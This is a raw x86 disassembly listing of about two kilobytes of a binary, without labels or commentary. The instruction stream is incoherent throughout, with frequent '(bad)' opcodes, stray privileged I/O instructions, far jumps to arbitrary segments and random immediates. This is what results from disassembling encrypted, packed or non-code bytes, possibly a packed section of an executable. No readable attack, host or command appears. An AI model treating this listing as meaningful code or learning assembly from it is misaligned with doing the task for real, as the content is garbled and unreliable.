  4030c2:	push   0xba1e9755
  4030c7:	and    ch,BYTE PTR [ecx-0x61]
  4030ca:	mov    DWORD PTR [edi+0x32],0xe6f2b8bb
  4030d1:	jl     0x40306e
  4030d3:	mov    edi,0x6b46919
  4030d8:	sbb    al,0x87
  4030da:	sbb    ebx,DWORD PTR gs:[esi-0x3523c2cd]
  4030e1:	xchg   ebp,eax
  4030e2:	cwde   
  4030e3:	ds jno 0x40313a
  4030e6:	adc    eax,0x37e31215
  4030eb:	mov    ah,0xea
  4030ed:	xlat   BYTE PTR ds:[ebx]
  4030ee:	or     DWORD PTR [esi-0x1e],ebx
  4030f1:	fisttp WORD PTR [ebx]
  4030f3:	and    BYTE PTR [edi+0x71521bef],cl
  4030f9:	outs   dx,BYTE PTR ds:[esi]
  4030fa:	std    
  4030fb:	and    ecx,ebp
  4030fd:	mov    ecx,0x88d013b8
  403102:	scas   eax,DWORD PTR es:[edi]
  403103:	cmp    bh,ah
  403105:	inc    ebx
  403106:	mov    BYTE PTR [edi+0x527d3025],dh
  40310c:	pop    edx
  40310d:	add    eax,0x41f55ba6
  403112:	jbe    0x40312d
  403114:	adc    BYTE PTR [ebx-0x411278aa],dh
  40311a:	push   ebp
  40311b:	push   eax
  40311c:	mov    bh,0x52
  40311e:	(bad)  
  40311f:	push   eax
  403120:	cmp    ebp,DWORD PTR [edx+0x7e]
  403123:	retf   0x122c
  403126:	stc    
  403127:	mov    ebx,0x538d8acd
  40312c:	fistp  WORD PTR [ebx]
  40312e:	pop    ss
  40312f:	inc    DWORD PTR [edi]
  403131:	lahf   
  403132:	int    0x9a
  403134:	xor    esi,DWORD PTR [ebx+0x4c803b93]
  40313a:	push   esi
  40313b:	pusha  
  40313c:	out    0x4b,eax
  40313e:	loopne 0x4030c6
  403140:	sub    al,0xc
  403142:	sub    eax,0x90b7895e
  403147:	out    0x11,eax
  403149:	inc    ecx
  40314a:	es jge 0x40318a
  40314d:	lods   al,BYTE PTR ds:[esi]
  40314e:	xchg   BYTE PTR [esi-0x658fe81],cl
  403154:	hlt    
  403155:	push   ebp
  403156:	xlat   BYTE PTR ds:[ebx]
  403157:	repnz cmp DWORD PTR [ebx],ebp
  40315a:	xor    dh,BYTE PTR [esi]
  40315c:	fld1   
  40315e:	pop    esi
  40315f:	xchg   ebx,eax
  403160:	cmp    bl,ah
  403162:	out    dx,al
  403163:	in     eax,0x93
  403165:	(bad)  
  403166:	jmp    0x40318b
  403168:	dec    esi
  403169:	test   BYTE PTR [ecx-0x38b684fc],bl
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x15902587
  403185:	jl     0x4031c5
  403187:	adc    eax,0x7d977070
  40318c:	jo     0x4031fe
  40318e:	adc    esp,DWORD PTR [ecx+0x65]
  403191:	shl    DWORD PTR [ebp+0x76],1
  403194:	shr    BYTE PTR [edx],0x62
  403197:	inc    ecx
  403198:	cmp    al,0x42
  40319a:	inc    edx
  40319b:	cdq    
  40319c:	inc    edx
  40319d:	mov    edi,0x7563ec08
  4031a2:	imul   cl
  4031a4:	and    eax,0x3dd3c988
  4031a9:	dec    ebx
  4031aa:	jmp    0x403153
  4031ac:	lahf   
  4031ad:	and    eax,0x1e810d1d
  4031b2:	mov    ah,0xd0
  4031b4:	and    DWORD PTR [ebx-0x6dae4faf],ecx
  4031ba:	and    DWORD PTR [esi],ecx
  4031bc:	add    ah,BYTE PTR [esi+0x4d]
  4031bf:	iret   
  4031c0:	xchg   edx,eax
  4031c1:	in     eax,dx
  4031c2:	mul    BYTE PTR [ebp+0x54b0cae4]
  4031c8:	imul   ebp,DWORD PTR [esp+edx*2+0x36d28017],0x1f
  4031d0:	fwait
  4031d1:	les    ebx,FWORD PTR [ebx+0x1367b55d]
  4031d7:	ss add ch,0x9a
  4031db:	repnz or eax,0xdf2ca564
  4031e1:	out    dx,al
  4031e2:	push   ss
  4031e3:	lahf   
  4031e4:	fwait
  4031e5:	cld    
  4031e6:	gs retf 
  4031e8:	jb     0x40321c
  4031ea:	cld    
  4031eb:	xor    al,0xcf
  4031ed:	mov    ebp,DWORD PTR ds:0xc05885ca
  4031f3:	jns    0x40320f
  4031f5:	call   0xe18f8674
  4031fa:	dec    edx
  4031fb:	lahf   
  4031fc:	sbb    dl,bl
  4031fe:	mov    cl,BYTE PTR [edi+0x2e]
  403201:	xchg   ebp,eax
  403202:	neg    DWORD PTR [edi+0x44f600a0]
  403208:	pop    ebx
  403209:	hlt    
  40320a:	jae    0x403271
  40320c:	fnstcw WORD PTR [edx-0x16]
  40320f:	clc    
  403210:	push   0xffffffba
  403212:	adc    eax,0x88c99ac9
  403217:	cmc    
  403218:	adc    eax,0xb8dd8401
  40321d:	xor    esp,DWORD PTR [ebx-0x3900e376]
  403223:	fs (bad) 
  403225:	mul    al
  403227:	fs xchg edx,eax
  403229:	and    eax,0x5da470de
  40322e:	mov    eax,0x9511920a
  403233:	fwait
  403234:	mov    DWORD PTR [ecx],ecx
  403236:	loop   0x4031bd
  403238:	into   
  403239:	dec    eax
  40323a:	xor    BYTE PTR [ebp+0x16],dl
  40323d:	dec    eax
  40323e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40323f:	ret    0xbbed
  403242:	in     eax,dx
  403243:	test   BYTE PTR [ebp-0x67],al
  403246:	jb     0x4032a2
  403248:	bound  esi,QWORD PTR [edx]
  40324a:	aad    0x62
  40324c:	stos   BYTE PTR es:[edi],al
  40324d:	stc    
  40324e:	(bad)  
  40324f:	(bad)  
  403250:	ss inc ebx
  403252:	mov    dh,0xc0
  403254:	dec    ebx
  403255:	jo     0x4032ac
  403257:	cli    
  403258:	adc    cl,BYTE PTR [ecx-0x54f20e7]
  40325e:	cwde   
  40325f:	test   eax,0x9e722433
  403264:	xor    bl,al
  403266:	inc    esi
  403267:	mov    cl,0x67
  403269:	pop    ebp
  40326a:	mov    BYTE PTR ds:0x4569525d,cl
  403270:	in     eax,dx
  403271:	jo     0x4032c4
  403273:	jle    0x403280
  403275:	shl    DWORD PTR [ecx-0x7c],cl
  403278:	sub    ah,BYTE PTR [esi-0x5758e925]
  40327e:	popa   
  40327f:	jle    0x40320d
  403281:	cmp    edi,esp
  403283:	in     eax,0xf9
  403285:	jmp    0xb0a8:0x469f430
  40328c:	xlat   BYTE PTR ds:[ebx]
  40328d:	imul   ebx,DWORD PTR ds:[eax],0xa149e961
  403294:	mov    bh,0xab
  403296:	or     BYTE PTR [eax-0x6],ah
  403299:	ror    BYTE PTR [edx],1
  40329b:	xchg   esi,eax
  40329c:	int    0xd6
  40329e:	(bad)  
  4032a0:	repnz dec esp
  4032a2:	(bad)  
  4032a3:	jmp    0x4032d2
  4032a5:	ins    BYTE PTR es:[edi],dx
  4032a6:	mov    eax,ds:0xb985a1c0
  4032ab:	das    
  4032ac:	mov    eax,0x260205d2
  4032b1:	js     0x4032da
  4032b3:	xor    al,0x1d
  4032b5:	adc    DWORD PTR [eax],eax
  4032b7:	or     BYTE PTR ds:0x55c7bc96,dh
  4032bd:	add    DWORD PTR [ecx-0x4213860],0xfffffffb
  4032c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c5:	sbb    al,BYTE PTR [edx]
  4032c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032c8:	adc    bh,BYTE PTR [ecx]
  4032ca:	shr    bl,0x59
  4032cd:	(bad)  
  4032ce:	cmp    DWORD PTR [ecx+0x18450fd4],0xffffff96
  4032d5:	mov    esi,eax
  4032d7:	test   al,0xbb
  4032d9:	rol    DWORD PTR [eax],0x81
  4032dc:	adc    al,0xec
  4032de:	out    0xd2,eax
  4032e0:	sub    dl,dh
  4032e2:	sar    DWORD PTR [ecx-0x1f167036],1
  4032e8:	mov    dl,0xc3
  4032ea:	add    DWORD PTR [esi-0x62901a2],0xffffffc4
  4032f1:	dec    ebx
  4032f2:	push   ds
  4032f3:	dec    edx
  4032f4:	push   edx
  4032f5:	js     0x403347
  4032f7:	mov    cl,0x6f
  4032f9:	sub    BYTE PTR [ebx+0x5df94cb8],ch
  4032ff:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403301:	adc    cl,0x7d
  403304:	jnp    0x4032c5
  403306:	pop    DWORD PTR [edx-0x7b]
  403309:	arpl   WORD PTR [edi+0x43],dx
  40330c:	outs   dx,BYTE PTR ds:[esi]
  40330d:	xchg   ebx,eax
  40330e:	cmp    DWORD PTR [esi-0x4e],edi
  403311:	cdq    
  403312:	repnz pushf 
  403314:	dec    esi
  403315:	out    dx,al
  403316:	xchg   di,ax
  403318:	pop    edi
  403319:	jno    0x403306
  40331b:	or     al,0x21
  40331d:	jl     0x403399
  40331f:	add    al,0x2c
  403321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403322:	mov    DWORD PTR [ebp+edx*8-0x31],edx
  403326:	mov    ?,esi
  403328:	dec    esp
  403329:	(bad)  
  40332a:	adc    bh,al
  40332c:	aas    
  40332d:	push   ss
  40332e:	repnz add eax,0xa702c6fc
  403334:	int    0x81
  403336:	sahf   
  403337:	jl     0x403329
  403339:	mov    dl,0x70
  40333b:	mov    esi,esp
  40333d:	ror    bh,0x3
  403340:	inc    eax
  403341:	cmp    eax,0xbea6ee0
  403346:	inc    edi
  403347:	(bad)  
  403348:	cmp    dh,BYTE PTR [esi+0x612d94cb]
  40334e:	sub    al,0xdd
  403350:	ss in  eax,dx
  403352:	stos   BYTE PTR es:[edi],al
  403353:	in     al,0xab
  403355:	add    cl,BYTE PTR [ecx+edi*1]
  403358:	out    0x22,eax
  40335a:	pop    ss
  40335b:	and    BYTE PTR [eax-0x7be628af],bh
  403361:	adc    eax,0x1c1fcb46
  403366:	cmp    eax,0xd17e1a8a
  40336b:	or     al,0xe2
  40336d:	mov    edx,0x8075b9e2
  403372:	stc    
  403373:	push   ds
  403374:	mov    al,ds:0x139a63c
  403379:	dec    ecx
  40337a:	sub    eax,0x6d10f0cb
  40337f:	call   0xdf1e:0x1845316f
  403386:	jo     0x4033d5
  403388:	xchg   edx,eax
  403389:	add    al,0xc8
  40338b:	push   ebp
  40338c:	scas   eax,DWORD PTR es:[edi]
  40338d:	and    DWORD PTR [ecx],esp
  40338f:	loope  0x4033c2
  403391:	stos   DWORD PTR es:[edi],eax
  403392:	dec    ebx
  403393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403394:	or     edx,edi
  403396:	inc    ecx
  403397:	call   eax
  403399:	mov    ecx,0x1b143019
  40339e:	mov    edi,DWORD PTR [edi]
  4033a0:	popa   
  4033a1:	inc    ebx
  4033a2:	(bad)  
  4033a3:	aas    
  4033a4:	xchg   edx,eax
  4033a5:	xor    BYTE PTR [eax+0x192bb702],ch
  4033ab:	cmp    ecx,DWORD PTR [ecx+0x8]
  4033ae:	or     eax,0x73f261b6
  4033b3:	adc    ebp,esi
  4033b5:	in     eax,0xb1
  4033b7:	mov    ds:0xb15850fa,eax
  4033bc:	xchg   BYTE PTR [eax+0x31],ah
  4033bf:	fdiv   st,st(5)
  4033c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033c2:	or     edx,0xea5b6151
  4033c8:	jbe    0x4033ce
  4033ca:	shr    BYTE PTR [ecx-0x43],1
  4033cd:	les    edi,FWORD PTR ds:0xba8d3e3b
  4033d3:	mov    al,0x63
  4033d5:	sbb    esp,DWORD PTR [ecx-0x6b]
  4033d8:	jns    0x4033de
  4033da:	ins    BYTE PTR es:[edi],dx
  4033db:	pop    eax
  4033dc:	int3   
  4033dd:	gs mov ebp,0xe97d7962
  4033e3:	or     al,0xcb
  4033e5:	lds    ebx,FWORD PTR [esi+ebp*1]
  4033e8:	std    
  4033e9:	xchg   esp,eax
  4033ea:	mov    edx,0xb4692f6c
  4033ef:	test   eax,0x70ab4280
  4033f4:	xchg   BYTE PTR [edx],dl
  4033f6:	popa   
  4033f7:	dec    ebp
  4033f8:	mov    ss,ecx
  4033fa:	pop    edi
  4033fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033fc:	jne    0x403424
  4033fe:	adc    ebp,DWORD PTR [ebp+0x11]
  403401:	xor    eax,0xb7af26bf
  403406:	jmp    0x403392
  403408:	dec    ecx
  403409:	addr16 lock nop
  40340c:	sar    DWORD PTR [ecx-0x52c7f8cd],0x11
  403413:	jp     0x851b3bc8
  403419:	cmp    edi,DWORD PTR [esi+0x1b]
  40341c:	push   ecx
  40341d:	clc    
  40341e:	jae    0x4033dd
  403420:	jbe    0x40340f
  403422:	push   ecx
  403423:	aad    0x3d
  403425:	adc    ch,BYTE PTR [edi+0x7950bc67]
  40342b:	ret    
  40342c:	in     eax,dx
  40342d:	xor    ah,BYTE PTR [ecx-0x79]
  403430:	out    dx,al
  403431:	pop    ds
  403432:	sahf   
  403433:	sbb    esi,DWORD PTR [ebp+0x28264a5a]
  403439:	imul   esi,DWORD PTR [eax+edx*8+0x17],0x2f0ad868
  403441:	fwait
  403442:	es jnp 0x4033ed
  403445:	test   eax,0xec7f4a36
  40344a:	inc    esp
  40344b:	lea    ebx,[ebx]
  40344d:	hlt    
  40344e:	scas   eax,DWORD PTR es:[edi]
  40344f:	sbb    eax,edi
  403451:	mov    ah,bh
  403453:	pushf  
  403454:	aad    0x17
  403456:	mov    al,ds:0xef23ab88
  40345b:	mov    ah,0xb7
  40345d:	dec    ebp
  40345e:	and    al,0xce
  403460:	inc    ebp
  403461:	inc    ebp
  403462:	shl    DWORD PTR [ebx],0xb
  403465:	int3   
  403466:	add    bl,ch
  403468:	xchg   edx,eax
  403469:	mov    al,ds:0x4706d6b4
  40346e:	add    DWORD PTR [esi-0x15bc8c98],ecx
  403474:	and    eax,0xc96e4f53
  403479:	push   eax
  40347a:	test   BYTE PTR [ebx-0x6f],bh
  40347d:	ss push 0x9924b708
  403483:	xchg   esi,eax
  403484:	bound  eax,QWORD PTR [esi-0xd51b873]
  40348a:	nop
  40348b:	out    dx,eax
  40348c:	lds    ebx,FWORD PTR [ebp-0x1d]
  40348f:	mov    ebp,0xf42b237a
  403494:	or     DWORD PTR [ecx+0x47a6b33f],eax
  40349a:	lods   eax,DWORD PTR ds:[esi]
  40349b:	fwait
  40349c:	sub    BYTE PTR gs:[ecx-0x24],bh
  4034a0:	sbb    ecx,DWORD PTR [eax+0x98eca5c]
  4034a6:	loop   0x403446
  4034a8:	sbb    DWORD PTR [esi],0x298aa77
  4034ae:	cmp    al,0xeb
  4034b0:	inc    edx
  4034b1:	mov    DWORD PTR [ecx+edx*2+0x781ad058],ecx
  4034b8:	retf   
  4034b9:	adc    bl,BYTE PTR [esi+0x29]
  4034bc:	jmp    0x40344a
  4034be:	inc    ecx
  4034bf:	adc    BYTE PTR [edi+eiz*1-0x87da89f],ah
  4034c6:	shl    BYTE PTR [ecx+ebx*8],cl
  4034c9:	push   ds
  4034ca:	jecxz  0x4034b9
  4034cc:	and    al,0x61
  4034ce:	retf   
  4034cf:	xchg   ebx,eax
  4034d0:	adc    DWORD PTR [esi],esp
  4034d2:	call   FWORD PTR [di]
  4034d5:	mov    dl,0x32
  4034d7:	popf   
  4034d8:	and    ah,BYTE PTR [esp+edi*1-0x3ad79bae]
  4034df:	bound  ebx,QWORD PTR [ebx-0x3a]
  4034e2:	pusha  
  4034e3:	int    0x4e
  4034e5:	std    
  4034e6:	xor    ah,BYTE PTR [ebx]
  4034e8:	jnp    0x4034ff
  4034ea:	mov    ds:0x230a103c,al
  4034ef:	stc    
  4034f0:	out    dx,eax
  4034f1:	add    eax,0x78c5c16d
  4034f6:	sbb    al,0x28
  4034f8:	xchg   edx,eax
  4034f9:	cs pushf 
  4034fb:	scas   al,BYTE PTR es:[edi]
  4034fc:	(bad)  
  4034fd:	xor    eax,0xc2f0be94
  403502:	xor    al,0x7e
  403504:	sbb    ebp,edx
  403506:	div    BYTE PTR [edx]
  403508:	or     DWORD PTR [eax],ebx
  40350a:	fidiv  DWORD PTR [ebx]
  40350c:	mov    ebp,0xa634838e
  403511:	pop    ecx
  403512:	mov    ch,0x12
  403514:	jbe    0x4034aa
  403516:	out    0x48,eax
  403518:	out    0x83,al
  40351a:	sbb    al,0x2d
  40351c:	cmc    
  40351d:	loop   0x4034fa
  40351f:	mov    bl,0x99
  403521:	push   cs
  403522:	fistp  DWORD PTR [ecx-0x11]
  403525:	test   DWORD PTR [ebx+eax*1],edi
  403528:	dec    BYTE PTR [ebx-0x50f0f78b]
  40352e:	cli    
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x40355e
  403544:	les    ecx,FWORD PTR [esi+0x70125550]
  40354a:	jo     0x4034e3
  40354c:	jge    0x4035be
  40354e:	jo     0x4035bc
  403550:	std    
  403551:	push   0x1455d7a8
  403556:	push   es
  403557:	xor    BYTE PTR ss:[edi+0x2887b839],bl
  40355e:	loopne 0x40352c
  403560:	mov    dl,0xd6
  403562:	mov    ?,ebx
  403564:	pusha  
  403565:	dec    esp
  403566:	push   0xffffffe4
  403568:	scas   eax,DWORD PTR es:[edi]
  403569:	dec    esi
  40356a:	sbb    BYTE PTR [edx],dh
  40356c:	out    0xf0,al
  40356e:	(bad)  
  40356f:	div    eax
  403571:	stc    
  403572:	lds    ecx,FWORD PTR [eax-0x4dfe91dd]
  403578:	mov    es,edi
  40357a:	xor    al,0x3f
  40357c:	add    BYTE PTR [edx+esi*8+0x35],al
  403580:	pop    ds
  403581:	lods   al,BYTE PTR ds:[esi]
  403582:	fbstp  TBYTE PTR [edi]
  403584:	jmp    0x82a6d6a
  403589:	aam    0x8a
  40358b:	shr    bl,1
  40358d:	hlt    
  40358e:	int    0x7c
  403590:	mov    edx,0x55eb6c92
  403595:	dec    eax
  403596:	lar    esi,si
  403599:	xor    BYTE PTR ds:0x49fc1b6,bh
  40359f:	aaa    
  4035a0:	cmp    BYTE PTR [edi-0x35],ah
  4035a3:	dec    edi
  4035a4:	sahf   
  4035a5:	(bad)  
  4035a8:	mov    ah,0x62
  4035aa:	adc    cl,0x25
  4035ad:	repz add eax,0xf36c85d5
  4035b3:	retf   
  4035b4:	mov    ecx,0x9ba94267
  4035b9:	dec    ebx
  4035ba:	xor    al,0x6d
  4035bc:	adc    edx,DWORD PTR [ebp+0x62]
  4035bf:	push   eax
  4035c0:	out    0x33,al
  4035c2:	and    esp,eax
  4035c4:	clc    
  4035c5:	inc    edx
  4035c6:	pop    edx
  4035c7:	or     al,0xf1
  4035c9:	jnp    0x403633
  4035cb:	jbe    0x40359b
  4035cd:	sbb    BYTE PTR [edx],dl
  4035cf:	fwait
  4035d0:	shr    DWORD PTR ds:0x27f5a5bd,0x82
  4035d7:	ja     0x403636
  4035d9:	call   0xb190:0x27a59c7d
  4035e0:	xchg   esp,eax
  4035e1:	popf   
  4035e2:	pop    ds
  4035e3:	inc    edi
  4035e4:	es jns 0x4035ce
  4035e7:	add    esp,DWORD PTR [ecx+edi*1-0x19]
  4035eb:	push   es
  4035ec:	(bad)  
  4035ed:	jo     0x4035d8
  4035ef:	cwde   
  4035f0:	mov    al,0x1
  4035f2:	inc    eax
  4035f3:	js     0x4035c1
  4035f5:	mov    dl,0xa7
  4035f7:	cwde   
  4035f8:	cld    
  4035f9:	rcl    ebx,1
  4035fb:	inc    ecx
  4035fc:	outs   dx,DWORD PTR ds:[esi]
  4035fd:	dec    ebx
  4035fe:	aas    
  4035ff:	cdq    
  403600:	(bad)  
  403601:	pop    esi
  403602:	jg     0x40358b
  403604:	mov    dh,0x22
  403606:	mov    ebp,esp
  403608:	int    0x1c
  40360a:	adc    edx,DWORD PTR [edx+0x74]
  40360d:	lea    esi,cs:[ebx+esi*2]
  403611:	mov    cl,0xc9
  403613:	dec    ebx
  403614:	add    BYTE PTR [esi],ch
  403616:	sbb    BYTE PTR [esi+0x507ec8ea],0xc9
  40361d:	loope  0x403695
  40361f:	je     0x403659
  403621:	or     DWORD PTR [edi],0xc28e4032
  403627:	mov    ch,0xc3
  403629:	bnd jno 0x403690
  40362c:	add    al,0x69
  40362e:	mov    ah,0x39
  403630:	mov    ecx,0x64780ad0
  403635:	mov    bh,0x6f
  403637:	fsub   QWORD PTR [edi+edx*2-0x3aa30b9f]
  40363e:	add    eax,0xcea50bb3
  403643:	idiv   al
  403645:	sub    ah,ch
  403647:	sbb    eax,esi
  403649:	imul   eax,DWORD PTR [ecx+0x48],0xffffffba
  40364d:	popa   
  40364e:	out    dx,al
  40364f:	fimul  WORD PTR ds:0x3f3e2ba9
  403655:	imul   ecx,esi,0xffffffa3
  403658:	pop    ebp
  403659:	push   edx
  40365a:	or     DWORD PTR [ecx+0x40aca46b],ecx
  403660:	add    al,BYTE PTR [esi+ecx*4-0x32a31e24]
  403667:	icebp  
  403668:	jmp    0x6487e25b
  40366d:	je     0x4036ad
  40366f:	cmc    
  403670:	ret    0x4461
  403673:	inc    esi
  403674:	add    BYTE PTR [esi-0x6e96fda5],0x1c
  40367b:	pop    es
  40367c:	xor    ah,ah
  40367e:	test   DWORD PTR [ebx+edi*4],ebp
  403681:	dec    ebx
  403682:	loopne 0x4036f2
  403684:	ss cmp al,0xdd
  403687:	bound  ebx,QWORD PTR [eax+edx*4]
  40368a:	and    eax,0x50b68d6
  40368f:	pushf  
  403690:	pop    eax
  403691:	push   esi
  403692:	imul   esi,DWORD PTR [esi-0x25],0x31b622d7
  403699:	rcr    DWORD PTR [edx-0x4e965c07],0x58
  4036a0:	xor    eax,0x37959936
  4036a5:	(bad)  
  4036a6:	shl    al,1
  4036a8:	outs   dx,BYTE PTR ds:[esi]
  4036a9:	xor    al,0x46
  4036ab:	(bad)  
  4036ad:	mov    edi,?
  4036af:	ins    BYTE PTR es:[edi],dx
  4036b0:	ret    0xd209
  4036b3:	push   es
  4036b4:	sahf   
  4036b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b6:	jmp    0xe71a:0x2ce092d3
  4036bd:	jle    0x403735
  4036bf:	clc    
  4036c0:	xlat   BYTE PTR ds:[ebx]
  4036c1:	dec    ecx
  4036c2:	iret   
  4036c3:	mov    ebx,0xaa258c40
  4036c8:	das    
  4036c9:	arpl   cx,bx
  4036cb:	mov    ds:0xfcb76292,al
  4036d0:	xor    BYTE PTR [edi],bl
  4036d2:	pop    ebx
  4036d3:	or     eax,0xd2d22f1d
  4036d8:	pop    edx
  4036d9:	icebp  
  4036da:	or     edx,DWORD PTR [edi-0x38]
  4036dd:	xor    eax,ebp
  4036df:	inc    esp
  4036e0:	xchg   edx,eax
  4036e1:	das    
  4036e2:	stos   DWORD PTR es:[edi],eax
  4036e3:	test   BYTE PTR [ecx],0x57
  4036e6:	add    al,0x7
  4036e8:	xor    DWORD PTR [edx-0x2fe91f71],eax
  4036ee:	mov    al,0x7
  4036f0:	sub    BYTE PTR [eax+0x44d2bc34],bh
  4036f6:	mov    ds:0x5ca431f5,eax
  4036fb:	dec    BYTE PTR gs:[eax+0x1b29158]
  403702:	enter  0x6a89,0xf7
  403706:	push   cs
  403707:	push   ecx
  403708:	in     eax,dx
  403709:	dec    eax
  40370a:	or     ebx,DWORD PTR ds:0xe84a2a0a
  403710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403711:	xchg   ebp,eax
  403712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403713:	fisub  DWORD PTR [edi+0x2c]
  403716:	xchg   ecx,eax
  403717:	dec    ecx
  403718:	fidiv  WORD PTR cs:[edx-0x7a64304c]
  40371f:	popf   
  403720:	push   cs
  403721:	test   al,0x14
  403723:	mov    gs,WORD PTR [edx+0x14]
  403726:	into   
  403727:	inc    ecx
  403728:	pop    edx
  403729:	ja     0x403729
  40372b:	imul   ebp,DWORD PTR [eax-0x10a61d3d],0xffffffd5
  403732:	adc    al,BYTE PTR [eax]
  403734:	fstp   TBYTE PTR [ecx-0x46c1231d]
  40373a:	clc    
  40373b:	js     0x403795
  40373d:	jl     0x40371e
  40373f:	mov    WORD PTR [edi-0x64b8e8ca],gs
  403745:	addr16 mov bl,0x7f
  403748:	cmovp  ebp,DWORD PTR [ebp-0x529e2fc4]
  40374f:	in     eax,0xef
  403751:	daa    
  403752:	push   esp
  403753:	cmp    BYTE PTR [ebp+0x46be5717],al
  403759:	jg     0x4036fa
  40375b:	jne    0x403760
  40375d:	dec    ebx
  40375e:	jle    0x4037a5
  403760:	xchg   edi,eax
  403761:	and    DWORD PTR [ebx-0x3e],0x1f
  403765:	push   edx
  403766:	inc    ecx
  403767:	inc    esp
  403768:	hlt    
  403769:	jl     0x40372d
  40376b:	cmp    edi,esp
  40376d:	das    
  40376e:	dec    eax
  40376f:	ret    0x879f
  403772:	jmp    0x2a92:0xa4de0fbb
  403779:	dec    esp
  40377a:	mov    ds:0xac35e1f0,eax
  40377f:	shr    BYTE PTR [edx+edx*4-0x15],1
  403783:	pop    edx
  403784:	mov    eax,ds:0xac0451e0
  403789:	fimul  WORD PTR [edi+0x250c83d3]
  40378f:	cli    
  403790:	xchg   ecx,eax
  403791:	scas   al,BYTE PTR es:[edi]
  403792:	shl    ebp,cl
  403794:	sub    eax,0x2850ff07
  403799:	not    DWORD PTR [ecx+0x388c6ce7]
  40379f:	dec    esp
  4037a0:	adc    al,0x62
  4037a2:	retf   
  4037a3:	jae    0x403766
  4037a5:	dec    eax
  4037a6:	xchg   ebp,ebx
  4037a8:	addr16 inc edi
  4037aa:	sar    BYTE PTR [ecx+0xed9b391],cl
  4037b0:	mov    dh,0x6f
  4037b2:	mov    bl,0xd2
  4037b4:	sub    ebx,DWORD PTR [ecx]
  4037b6:	out    0x1d,al
  4037b8:	inc    ebx
  4037b9:	add    esp,DWORD PTR [ebp-0x2ad53981]
  4037bf:	ror    DWORD PTR [edx],1
  4037c1:	mov    al,0x2c
  4037c3:	inc    dl
  4037c5:	ret    0x40ba
  4037c8:	inc    esi
  4037c9:	and    esi,DWORD PTR [esi-0x1a]
  4037cc:	fidiv  DWORD PTR [edx]
  4037ce:	mov    WORD PTR [esi],?
  4037d0:	mov    cl,0xff
  4037d2:	push   esp
  4037d3:	sbb    DWORD PTR gs:[edx-0x31],ebx
  4037d7:	and    BYTE PTR [ecx+eax*4-0x7677b83f],ch
  4037de:	mul    DWORD PTR [ecx+ebp*4+0x1857196c]
  4037e5:	addr16 aad 0x23
  4037e8:	std    
  4037e9:	adc    edi,DWORD PTR [ecx+0x3288c76a]
  4037ef:	xor    al,0x44
  4037f1:	adc    eax,eax
  4037f3:	inc    esp
  4037f4:	ret    0x7873
  4037f7:	in     eax,dx
  4037f8:	sahf   
  4037f9:	pop    esp
  4037fa:	push   ebp
  4037fb:	(bad)  
  4037fc:	sbb    edi,DWORD PTR [ebx+eax*4]
  4037ff:	pop    eax
  403800:	sub    BYTE PTR [ecx-0x44],dl
  403803:	xor    bh,BYTE PTR [eax-0x772b6bd4]
  403809:	jno    0x403835
  40380b:	iret   
  40380c:	lea    esp,[edi]
  40380e:	aaa    
  40380f:	mov    ds:0x17ed84dc,al
  403814:	lock push ebx
  403816:	pop    esp
  403817:	lea    ecx,[esi+0x51]
  40381a:	jl     0x4037b8
  40381c:	mov    ch,BYTE PTR [ecx+0x616f0bc5]
  403822:	push   eax
  403823:	or     al,0x7e
  403825:	arpl   WORD PTR [ebx],ax
  403827:	add    DWORD PTR [esi],ecx
  403829:	fwait
  40382a:	xor    BYTE PTR [esi+0xb051403],ah
  403830:	test   DWORD PTR [ebx-0x51e07e2e],ebp
  403836:	daa    
  403837:	std    
  403838:	xchg   esi,eax
  403839:	imul   DWORD PTR [edi+0x23]
  40383c:	pop    ebx
  40383d:	add    eax,0xea6927f6
  403842:	push   ebx
  403843:	push   0x39d30ab8
  403848:	out    0xea,al
  40384a:	std    
  40384b:	retf   
  40384c:	mov    WORD PTR [eax+0xe],cs
  40384f:	jae    0x403889
  403851:	dec    eax
  403852:	in     eax,0x83
  403854:	cdq    
  403855:	inc    ebp
  403856:	stos   BYTE PTR es:[edi],al
  403857:	aam    0xc7
  403859:	daa    
  40385a:	sar    DWORD PTR [esi+esi*2],1
  40385d:	ret    
  40385e:	add    ecx,DWORD PTR [edi+0x2f5431ea]
  403864:	inc    ebx
  403865:	addr16 mov bh,0x2d
  403868:	scas   al,BYTE PTR es:[edi]
  403869:	xchg   edx,eax
  40386a:	addr16 es jbe 0x40385d
  40386e:	cli    
  40386f:	and    eax,0x9986b24f
  403874:	cwde   
  403875:	or     BYTE PTR [esi],cl
  403877:	jb     0x4038e7
  403879:	cmp    BYTE PTR [eax+eiz*2],0xe1
  40387d:	bound  ecx,QWORD PTR [ebx-0x1959493]
  403883:	mov    esi,DWORD PTR [ebx+0x69baae62]
  403889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40388a:	jb     0x40385a
  40388c:	adc    cl,ah
  40388e:	add    DWORD PTR [eax+ebp*8],0x74
  403892:	mov    esi,0xea424854
  403897:	cmp    BYTE PTR [edi-0x18],bh
  40389a:	cld    
  40389b:	fmul   st,st(1)
  40389d:	sbb    eax,0x8c9e1fb9
  4038a2:	mov    ebx,0xb904ac23
  4038a7:	loopne 0x403917
  4038a9:	push   esi
  4038aa:	mov    ch,0x6
  4038ac:	dec    eax
  4038ad:	rol    ah,1
  4038af:	dec    eax
  4038b0:	mov    dh,0x23
  4038b2:	and    eax,0xce50c297
  4038b7:	pop    ecx
